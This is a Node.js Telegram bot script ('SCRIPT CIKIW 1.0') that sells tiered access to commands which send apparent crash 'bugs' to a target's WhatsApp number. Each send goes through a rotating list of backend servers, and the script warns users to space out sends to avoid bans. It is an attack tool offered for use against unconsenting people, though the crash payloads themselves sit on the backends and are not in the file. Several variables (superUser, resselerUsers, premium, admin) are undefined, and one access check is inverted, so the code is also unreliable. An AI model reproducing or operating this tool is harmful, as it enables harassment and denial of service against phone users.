const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const global = require('./cikiw.js');
let botApiUrls = JSON.parse(fs.readFileSync('./botApi.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));
let bannedUsers = JSON.parse(fs.readFileSync('./banned.json'));
let superVip = JSON.parse(fs.readFileSync('./superVip.json'));
const bot = new TelegramBot(global.botToken, { polling: true });
const cooldowns = new Map();
const superAdmin = global.superAdmin;

async function startUndefined() {
try {
let currentUrlIndex = 0;
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}
function saveBotApiUrls() {
    fs.writeFileSync('./botApi.json', JSON.stringify(botApiUrls, null, 2));
}
function saveSuperVip() {
    fs.writeFileSync('./superVip.json', JSON.stringify(superVip, null, 2));
}
function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveBannedUsers() {
    fs.writeFileSync('./banned.json', JSON.stringify(bannedUsers, null, 2));
}
async function fetchWithTimeout(url, timeout) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        const response = await axios.get(url, { signal: controller.signal });
        clearTimeout(timeoutId);
        return response.data;
    } catch (error) {
        console.error(`Error fetching URL ${url}: ${error.message}`);
        return null;
    }
}
function getNextUrlIndex() {
    currentUrlIndex = (currentUrlIndex + 1) % botApiUrls.length;
    return currentUrlIndex;
}
watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));
watchFile('./botApi.json', (data) => (botApiUrls = data));
watchFile('./banned.json', (data) => (bannedUsers = data));
watchFile('./superVip.json', (data) => (superVip = data));

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const undefined_mp4 = global.preview;
    const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
    let ligma = `Helo User ${senderName} .Let me introduce myself, my name is REF MD Developer of SCRIPT CIKIW 1.0, that's all the introduction, I hope it helps you if this SCRIPT has an error, this SC will error if Update 1.1, good luck using it by ref MDQ
    
⟣────Menu bug───────
䒘 /bugIos  [ 628 ] [ Bug IOS 
䒘 /bugdro  [ 628 ] [ Bug android ]

⟣────comand other menu───────⟣
䒘 /addpremium [ add premium user ] 
䒘 /addadmin [ add admin user ]
䒘 /addsvip [ add svip user ]
䒘 /addbot [ add bot ]
䒘 /refresh [ cek status bot ]
䒘 /ban [ ban user]
䒘 /unban [ unban user ban ]
䒘 /delsvip [ del user svip ]
䒘 /delpremium [ del user prem ]
䒘 /deladmin [ del user admin ]
䒘 /listbot [ list bot bug ]

DEVELOPER
@RefmdDev1`;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    bot.sendVideo(chatId, undefined_mp4, {
        caption: ligma,
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: "Owner Channel「💬」",
                        url: global.channelLink
                    }
                ]
            ]
        }
    });
});
bot.onText(/\/cikiw-andro(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    if (!premiumUsers.includes(senderId) && !adminUsers.includes(senderId) && superVip.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not a premium user. Access denied.");
    }

    const lastUsed = cooldowns.get(senderId);
    const now = Date.now();
    if (lastUsed && now - lastUsed < 180 * 1000) {
        const remainingTime = Math.ceil((180 * 1000 - (now - lastUsed)) / 1000);
        return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /cikiw-andro +628xxxx.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /cikiw-andro +628xxxx.");
    }

    let totalBot = 0;
    let attempts = 0;
    let maxAttempts = botApiUrls.length;
    while (attempts < maxAttempts) {
        const url = botApiUrls[currentUrlIndex];
        const fullUrl = `${url}/refmd?chatId=${numberTarget}@s.whatsapp.net&type=bugdro`;

        const result = await fetchWithTimeout(fullUrl, 3000);
        if (result) {
            console.log(`${url} sent successfully.`);
            totalBot++;
            currentUrlIndex = getNextUrlIndex();
            break;
        } else {
            console.log(`${url} failed.`);
            currentUrlIndex = getNextUrlIndex();
            attempts++;
        }
    }
    if (totalBot === 0) {
        bot.sendMessage(chatId, `❌ No server online right now.`);
    } else {
        const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
        bot.sendMessage(chatId, `✅ Bug sent successfully
${senderName}
Target: ${numberTarget}
Bug Type: 🔥 cikiw-andro
Time: ${new Intl.DateTimeFormat('en-GB', { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())}

Please wait 5-10 minutes before resending to avoid bot banning.`);
        console.log(`✅ Bug sent successfully
${senderName}
Target: ${numberTarget}
Bug Type: 🔥 cikiw-andro
Time: ${new Intl.DateTimeFormat('en-GB', { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())}`)
    }
    cooldowns.set(senderId, now);
});
bot.onText(/\/cikiw-andro2(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    if (!premiumUsers.includes(senderId) && !adminUsers.includes(senderId) && superVip.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not a premium user. Access denied.");
    }

    const lastUsed = cooldowns.get(senderId);
    const now = Date.now();
    if (lastUsed && now - lastUsed < 180 * 1000) {
        const remainingTime = Math.ceil((180 * 1000 - (now - lastUsed)) / 1000);
        return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /cikiw-andro2 +628xxxx.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /cikiw-andro2 +628xxxx.");
    }

    let totalBot = 0;
    let attempts = 0;
    let maxAttempts = botApiUrls.length;
    while (attempts < maxAttempts) {
        const url = botApiUrls[currentUrlIndex];
        const fullUrl = `${url}/permen?chatId=${numberTarget}@s.whatsapp.net&type=bugios`;

        const result = await fetchWithTimeout(fullUrl, 3000);
        if (result) {
            console.log(`${url} sent successfully.`);
            totalBot++;
            currentUrlIndex = getNextUrlIndex();
            break;
        } else {
            console.log(`${url} failed.`);
            currentUrlIndex = getNextUrlIndex();
            attempts++;
        }
    }
    if (totalBot === 0) {
        bot.sendMessage(chatId, `❌ No server online right now.`);
    } else {
        const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
        bot.sendMessage(chatId, `✅ Bug sent successfully
${senderName}
Target: ${numberTarget}
Bug Type: 🗿cikiw-andro2
Time: ${new Intl.DateTimeFormat('en-GB', { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())}

Please wait 5-10 minutes before resending to avoid bot banning.`);
        console.log(`✅ Bug sent successfully
${senderName}
Target: ${numberTarget}
Bug Type: 🗿cikiw-andro2
Time: ${new Intl.DateTimeFormat('en-GB', { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())}`)
    }
    cooldowns.set(senderId, now);
});
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }

    if (!adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addprem 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addprem 6843967527.");
    }

    if (!premiumUsers.includes(userId)) {
        premiumUsers.push(userId);
        savePremiumUsers();
        console.log(`${senderId} Added ${userId} To Premium`)
        bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already a premium user.`);
    }
});
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }

    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to add admins.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`)
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});
bot.onText(/\/ban(?:\s(\d+)\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You have been banned from using this bot.");
    }

    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to ban users.");
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and reason. Example: /ban 6843967527 Spamming.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    const reason = match[2] ? match[2].trim() : "-";

    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /ban 6843967527 Spamming.");
    }

    if (!bannedUsers.includes(userId)) {
        bannedUsers.push(userId);
        saveBannedUsers();

        bot.sendMessage(chatId, `✅ User ${userId} has been banned.\nReason: ${reason}`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already banned.`);
    }
});
bot.onText(/\/addsvip(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }

    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addsvip 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addsvip 6843967527.");
    }

    if (!superVip.includes(userId)) {
        superVip.push(userId);
        saveSuperVip();
        console.log(`${senderId} Added ${userId} To Super VIP`)
        bot.sendMessage(chatId, `✅ User ${userId} has been added to the Super VIP list.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already a Super VIP user.`);
    }
});
bot.onText(/\/addbot(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const newUrl = match?.[1]?.trim();
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to access the server.");
    }
    if (!newUrl) {
        return bot.sendMessage(chatId, "❌ Invalid usage. Please provide a URL.");
    }
    if (botApiUrls.includes(newUrl)) {
        return bot.sendMessage(chatId, "❌ This URL is already in the bot API list.");
    }
    botApiUrls.push(newUrl);
    saveBotApiUrls();
    bot.sendMessage(chatId, `✅ New bot URL has been added: ${newUrl}`);
});
bot.onText(/\/listbot/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to access the server.");
    }
    if (botApiUrls.length === 0) {
        return bot.sendMessage(chatId, "❌ No bot URLs found.");
    }
    const urlList = botApiUrls.map((url, index) => `${index + 1}. ${url}`).join('\n');
    bot.sendMessage(senderId, `✅ List of bot URLs:\n\n${urlList}`);
});
bot.onText(/\/delbot (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    const index = parseInt(match[1], 10) - 1;
    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to delete bot URLs.");
    }
    if (index < 0 || index >= botApiUrls.length) {
        return bot.sendMessage(chatId, "❌ Invalid index. Use /listbot to see available URLs.");
    }
    const deletedUrl = botApiUrls.splice(index, 1)[0];
    saveBotApiUrls();
    bot.sendMessage(chatId, `✅ Bot URL deleted:\n${deletedUrl}`);
});
bot.onText(/\/deladmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    if (!superUser.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove admins.");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }
    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (adminUsers.includes(userId)) {
        adminUsers = adminUsers.filter(id => id !== userId);
        saveAdminUsers();
        console.log(`${senderId} Deleted ${userId} From Admin`)
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from the admin list.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }

    if (!adminUsers.includes(senderId) && !resselerUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /delprem 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (premiumUsers.includes(userId)) {
        premiumUsers = premiumUsers.filter(id => id !== userId);
        savePremiumUsers();
        console.log(`${senderId} Deleted ${userId} From Premium`)
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not a premium user.`);
    }
});
bot.onText(/\/unban(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }

    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to unban users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /unban 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (bannedUsers.includes(userId)) {
        bannedUsers = bannedUsers.filter(id => id !== userId);
        saveBannedUsers();
        bot.sendMessage(chatId, `✅ User ${userId} has been unbanned.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not banned.`);
    }
});
bot.onText(/\/statusbot/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }

    if (!superAdmin.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to access the server.");
    }

    let statusMessage = "Bot Statuses:\n\n";
    for (let i = 0; i < botApiUrls.length; i++) {
        const botUrl = botApiUrls[i];
        let status = "🔴";

        try {
            const response = await axios.get(`${botUrl}/status`, { timeout: 5000 });
            if (response?.data?.connected) {
                status = "🟢";
            }
        } catch (error) {
            console.error(`Error checking status of ${botUrl}:`, error.message);
        }

        statusMessage += `${i + 1}. ${status} ${botUrl}\n`;
    }

    bot.sendMessage(chatId, statusMessage);
});
bot.onText(/\/refresh/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }

    if (!superAdmin.includes(senderId) && !superVip.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to access the server.");
    }
    let onlineBot = 0;
    for (let i = 0; i < botApiUrls.length; i++) {
        const botUrl = botApiUrls[i];
        try {
            const response = await axios.get(`${botUrl}/refresh`, { timeout: 5000 });
            if (response?.data?.connected) {
                onlineBot++
            }
        } catch (error) {
            console.error(`Error checking status of ${botUrl}:`, error.message);
        }
    }

    bot.sendMessage(chatId, `Bot Refreshed ✅\n${onlineBot}/${botApiUrls.length} Are Online`);
});
bot.onText(/\/status(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    if (bannedUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "You Have Been Banned From This Bot");
    }
    if (!adminUsers.includes(senderId) && !resselerUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /status 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /status 6843967527.");
    }
    let statusInfo = '';
    if (bannedUsers.includes(userId)) {
        statusInfo = "This Users Has Been Banned By Owner"
    } else if (superAdmin.includes(userId)) {
        statusInfo = "The King Of King, Owners"
    } else {
        statusInfo = `Premium: ${premium.includes(userId) ? "true" : "false"}
Admin: ${admin.includes(userId) ? "true" : "false"} svip: ${superVip.includes(userId) ? "true" : "false"}`
    }
bot.sendMessage(chatId, `User Status Is
ID: ${userId}
${statusInfo}`);
});


} catch (error) {
    console.log(error)
}

};

startUndefined()